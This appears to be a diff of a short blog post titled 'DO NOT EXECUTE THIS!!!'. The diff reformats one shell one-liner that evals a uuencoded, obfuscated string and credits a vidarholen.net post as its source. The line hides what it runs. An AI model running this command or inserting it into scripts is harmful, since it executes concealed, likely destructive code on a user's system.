@@ -3,9 +3,7 @@ layout: post
 title: DO NOT EXECUTE THIS!!!
 ---
 
-```
-eval $(echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode)
-```
+```eval $(echo "I<RA('1E<W3t`rYWdl&r()(Y29j&r{,3Rl7Ig}&r{,T31wo});r`26<F]F;==" | uudecode)```
 Source: [https://www.vidarholen.net/contents/blog/?p=766]  
 <br>
   
